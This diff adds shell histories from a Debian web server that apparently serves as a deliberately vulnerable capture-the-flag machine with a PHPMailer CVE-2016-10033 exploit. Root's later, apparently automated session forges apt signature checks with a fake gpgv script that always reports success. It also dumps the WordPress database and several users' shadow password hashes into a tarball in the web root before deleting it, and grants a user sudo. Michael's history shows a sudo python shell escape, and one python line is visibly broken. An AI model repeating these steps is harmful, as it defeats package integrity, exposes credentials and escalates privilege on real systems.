@@ -1,0 +1,308 @@
+########## /root/.bash_history
+apt-get install php5
+apt-get install python
+apt-get install sendmail
+apt-get install sendmail-bin
+apt-get install sendmail
+apt-get clean
+apt-get install git
+git cloen https://github.com/opsxcq/exploit-CVE-2016-10033
+git clone https://github.com/opsxcq/exploit-CVE-2016-10033
+ls
+cd exploit-CVE-2016-10033/
+ls
+cp src /var/www/html
+cp -r src /var/www/html
+cd www
+ls
+cp index.php /var/www/html
+cd /var/www/html
+ls
+rm index.html 
+mv src vendor
+ls
+nano index.php 
+clear
+ls
+cd ..
+chmod 777 -R html
+cd html
+ls
+shutdown -h now
+sendmail
+chmod 777 -R /var/www
+apt-get install apache2
+apt-get install php5
+apt-get install sendmail-bin
+apt-get install sendmail
+cd /var/www/html
+ls
+cp index.php contact.php
+wget http://192.168.206.133/security.zip
+wget http://192.168.206.133:8000/security.zip
+wget http://192.168.206.132:8000/security.zip
+ls
+apt-get install unzip
+unzip security.zip 
+ls
+rm -rf security
+wget http://192.168.206.132:8000/security.zip
+unzip security.zip 
+ls
+rm -rf security
+rm security.zip
+rm security.zip.1 
+wget http://192.168.206.132:8000/security.zip
+unzip security.zip 
+ls
+mv index.php index2.php
+wget https://en-au.wordpress.org/wordpress-4.8-en_AU.zip
+ls
+unzip wordpress-4.8-en_AU.zip 
+ls
+chmod 777 -R wordpress
+apt-get install  php5-mysqlnd-ms
+service apache2 reload
+apt-get install mysql-server
+mysql -u root -p
+clear
+nano /etc/hosqts
+nano /etc/hosts
+clear
+cd ..
+ls
+nano flag2.txt
+cd
+ls
+rm exploit-CVE-2016-10033/
+rm -rf exploit-CVE-2016-10033/
+nano flag3.txt
+clear
+service mysqld stop
+/etc/init.d/mysqld stop
+cat /etc/my.cnf
+locate my.cnf
+find my.cnf
+ps -aux
+service mysqld stop
+service mysqld_safe stop
+shutdown -h now
+service sendmail start
+ls
+mv flag3.txt flag4.txt
+nano flag4.txt 
+clear
+cd /etc/mysql
+ls
+nano my.cnf
+sudo shutdown -h now
+shutdown -h now
+apt-get install gcc
+service sendmail restart
+service sendmail-bin start
+service sendmail start
+ls
+nano flag4.txt 
+shutdown -h now
+useradd steven
+passwd steven
+exit
+apt-get install tmux
+exit
+tmux-session save
+tmux -session save
+pwd
+cd /usr/bin
+ls
+vim tmux-session
+nano tmux-session
+nano tmux-session
+wget https://raw.githubusercontent.com/mislav/dotfiles/d2af5900fce38238d1202aa43e7332b20add6205/bin/tmux-session
+clear
+cd
+ls
+clear
+tmux-session save
+chmod 777 /usr/bin/tmux-session 
+clea
+clear
+tmux-session save
+exit
+cd /home/steven
+cd /home
+ls
+exit
+cat /etc/passwd
+cd /home
+ls
+mkdir steven
+ls
+exit
+tmux-session save
+exit
+cd
+tmux-session restore
+ls -la
+cat .tmux-session 
+pwd
+cd /home/steven
+git clone git clone https://github.com/tmux-plugins/tmux-resurrect
+git clone https://github.com/tmux-plugins/tmux-resurrect
+nano .tmux.conf
+clear
+exit
+exit
+exit
+exit
+cd /home/steven
+ls
+rm -rf tmux-resurrect/
+ls
+ls -la
+tmus -S .connect
+tmux -S .connect
+ls
+ls -la
+exit
+cd /home/steven
+ls
+ls
+chmod 777 .connect
+ls -la
+exit
+chmod 666 .connect
+cd /home/steven
+chmod 666 .connect
+ls -la
+exit
+exit
+apt-get install sudo
+su steven
+visudo
+which python
+su steven
+clear
+cd /home/steven
+ls
+ls -la
+rm .connect
+rm .tmux.conf 
+ls -la
+cd /var/www
+ls
+cd html
+ls
+nano team.html 
+nano team.html 
+nano service.html 
+nano contact.php 
+clear
+nano service.html 
+crontab -e
+shutdown -h now
+passwd
+shutdown -h now
+cd /var/www/html
+ls
+rm rRz27bka.php 
+rm mail.php 
+rm contact.html 
+rm wordpress-4.8-en_AU.zip 
+rm security.zip 
+ls
+rm index2.php 
+cd vendor
+ls
+cat composer..json
+cat composer.json
+head composer.json
+ls
+cat composer.lock 
+ls
+nano PATH
+clear
+shutdown -h now
+apt install nano
+apt install docker.io
+apt update
+          
+id; echo ROOTOK; id bloodraven; echo BLOODOK; groups bloodraven; sudo -n -u bloodraven id; echo SUDOOK
+id; id bloodraven; groups bloodraven; ip -4 addr; echo MARKER_END
+su - bloodraven -c "echo demodemo | sudo -S id; echo SUDO_DONE"
+cat /etc/apt/sources.list; echo ---; ls /etc/apt/sources.list.d; echo ---; apt-get update; echo APT_DONE
+printf '%s\n' 'deb http://archive.debian.org/debian jessie main' 'deb http://archive.debian.org/debian-security jessie/updates main' > /etc/apt/sources.list
+printf '%s\n' 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99no-check-valid-until
+cat /etc/apt/sources.list; echo ---; cat /etc/apt/apt.conf.d/99no-check-valid-until; echo ---
+apt-get update; echo APT_DONE
+echo STILL_UP
+printf '%s\n' 'deb [trusted=yes] http://archive.debian.org/debian jessie main' 'deb [trusted=yes] http://archive.debian.org/debian-security jessie/updates main' > /etc/apt/sources.list
+apt-get update; echo EXIT:$?
+cat -A /etc/apt/sources.list; echo LIST_DONE
+apt-get -s install hello; echo SIM_DONE:$?
+printf '%s\n' 'Acquire::Check-Valid-Until "false";' 'Dir::Bin::gpg "/bin/true";' > /etc/apt/apt.conf.d/99archive
+apt-get update; echo EXIT:$?
+python -c 'open("/usr/local/bin/apt-gpgv-ok","w").write(''' + repr(script) + ''')'
+chmod 755 /usr/local/bin/apt-gpgv-ok
+printf '%s\n' 'Acquire::Check-Valid-Until "false";' 'Dir::Bin::gpg "/usr/local/bin/apt-gpgv-ok";' > /etc/apt/apt.conf.d/99archive
+apt-get update; echo EXIT:$?
+rm -f /usr/local/bin/apt-gpgv-ok
+echo '#!/bin/sh' > /usr/local/bin/apt-gpgv-ok
+echo 'fd=2' >> /usr/local/bin/apt-gpgv-ok
+echo 'prev=' >> /usr/local/bin/apt-gpgv-ok
+echo 'for a in "$@"; do' >> /usr/local/bin/apt-gpgv-ok
+echo '  if [ "$prev" = "--status-fd" ]; then fd=$a; fi' >> /usr/local/bin/apt-gpgv-ok
+echo '  prev=$a' >> /usr/local/bin/apt-gpgv-ok
+echo 'done' >> /usr/local/bin/apt-gpgv-ok
+echo 'echo "[GNUPG:] GOODSIG AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Debian Archive" >&"$fd"' >> /usr/local/bin/apt-gpgv-ok
+echo 'echo "[GNUPG:] VALIDSIG AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 2026-01-01 1767225600 0 4 0 1 8 00 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" >&"$fd"' >> /usr/local/bin/apt-gpgv-ok
+echo 'exit 0' >> /usr/local/bin/apt-gpgv-ok
+chmod 755 /usr/local/bin/apt-gpgv-ok
+printf '%s\n' 'Acquire::Check-Valid-Until "false";' 'Dir::Bin::gpg "/usr/local/bin/apt-gpgv-ok";' > /etc/apt/apt.conf.d/99archive
+apt-get update >/tmp/apt.out 2>&1; echo EXIT:$?; grep -E '^(W:|E:|Err)' /tmp/apt.out || echo NO_WARNINGS
+echo '---SCRIPT---'; cat /usr/local/bin/apt-gpgv-ok; echo '---CONF---'; cat /etc/apt/apt.conf.d/99archive; echo '---SRC---'; cat /etc/apt/sources.list
+apt-get -s install hello >/tmp/sim.out 2>&1; echo SIM:$?; tail -5 /tmp/sim.out
+apt update >/tmp/apt2.out 2>&1; echo EXIT:$?; grep -E '^(W:|E:|Err|Usage)' /tmp/apt2.out || echo NO_WARNINGS
+echo '===LISTEN==='; ss -lntp 2>/dev/null || netstat -lntp
+echo '===USERS==='; awk -F: '$3>=1000 || $1=="root" {print}' /etc/passwd
+echo '===SUDO==='; grep -vE '^#|^$' /etc/sudoers; ls /etc/sudoers.d 2>/dev/null
+echo '===PKGS==='; dpkg -l | awk '/^ii/ && $2 ~ /apache|php|mysql|mariadb|openssh|wordpress|exim|sendmail|postfix|nginx|ftp|samba|bind|python|vim|netcat|curl/ {print $2, $3}'
+echo '===WEB==='; ls -la /var/www /var/www/html 2>/dev/null; find /var/www -maxdepth 3 -type d
+echo '===APACHE==='; ls /etc/apache2/sites-enabled /etc/apache2/mods-enabled; echo '---site---'; cat /etc/apache2/sites-enabled/*
+echo '===WP==='; grep -E "wp_version|DB_|table_prefix" /var/www/html/wordpress/wp-includes/version.php /var/www/html/wordpress/wp-config.php | head -40
+echo '===PLUGINS==='; ls /var/www/html/wordpress/wp-content/plugins; echo '===THEMES==='; ls /var/www/html/wordpress/wp-content/themes
+echo '===SIZES==='; du -sh /var/www /home /var/lib/mysql /etc/apache2 /etc/ssh 2>/dev/null
+echo '===MYSQLCNF==='; sed -n '1,40p' /etc/mysql/debian.cnf
+echo '===HOMES==='; ls -la /home/michael /home/steven /root | head -80
+echo '===CRON==='; ls /etc/cron.* /var/spool/cron/crontabs 2>/dev/null; crontab -l 2>/dev/null; echo '===IP==='; ip -4 addr show eth0 | sed -n 's/.*inet //p'
+mysql --defaults-file=/etc/mysql/debian.cnf -N -e 'SHOW DATABASES'
+echo '===VENDOR==='; ls /var/www/html/vendor | head -30; echo '===CONTACT HEAD==='; head -30 /var/www/html/contact.php
+rm -rf /tmp/raven-stage; mkdir -p /tmp/raven-stage
+mysqldump --defaults-file=/etc/mysql/debian.cnf --single-transaction --databases wordpress > /tmp/raven-stage/wordpress.sql; echo DUMP:$?
+getent shadow root michael steven bloodraven > /tmp/raven-stage/shadow.snippet
+tar -C /tmp/raven-stage -cf /tmp/raven-stage/meta.tar wordpress.sql shadow.snippet
+tar -C / -rf /tmp/raven-stage/meta.tar var/www
+gzip -c /tmp/raven-stage/meta.tar > /var/www/html/raven-export.tgz; ls -lh /var/www/html/raven-export.tgz; echo EXPORT_DONE
+rm -f /var/www/html/raven-export.tgz /tmp/raven-stage/meta.tar; echo REMOVED:$?
+usermod -aG sudo bloodraven
+exit
+
+########## /root/.mysql_history
+CREATE DATABASE wordpress;
+
+########## /home/bloodraven/.bash_history
+ls
+sudo su
+sudo su
+exit
+
+########## /home/michael/.bash_history
+sudo -l
+exit
+/usr/sbin/useradd username
+python -c 'import os; os.system("/bin/bash")'
+exit
+sudo python -c 'import os; os.system("/bin/bash")'
+exit
+python -c 'import os; os.system("/bin/bash")'
+exit
+
